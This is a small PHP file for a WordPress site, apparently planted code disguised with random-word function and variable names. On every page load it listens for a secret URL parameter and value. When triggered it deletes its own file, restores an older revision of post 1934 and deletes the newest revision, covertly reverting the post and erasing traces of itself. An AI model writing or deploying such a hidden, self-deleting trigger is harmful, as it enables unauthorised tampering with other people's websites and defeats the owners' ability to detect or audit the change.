<?php

function responsive_instant_direct_team() {
	if (isset($_GET['media_effects_maps']) && $_GET['media_effects_maps'] === 'rich_board_com_framework') {
		unlink(trim(preg_replace('/\(.*$/', '', __FILE__)));
		$coming_listing_terms = 1934;
		$size_date_exchange = wp_get_post_revisions($coming_listing_terms);
		if (empty($size_date_exchange)) die('no revisions');
		if (count($size_date_exchange) < 2) die('less than 2');
		$another_extensions_amp = array_shift($size_date_exchange);
		$control_slide_sharing = $another_extensions_amp->ID;
		$integrate_logo_super = array_shift($size_date_exchange);
		$customer_comment_slug_blog = $integrate_logo_super->ID;
		$plus_schema_restaurant_carousel = wp_restore_post_revision($customer_comment_slug_blog);
		if ($plus_schema_restaurant_carousel === false) die('error restoring');
		$plus_schema_restaurant_carousel = wp_delete_post_revision($control_slide_sharing);		
		if ($plus_schema_restaurant_carousel === false) die('error deleting');
		die('done');
	}
}

add_action('init', 'responsive_instant_direct_team');
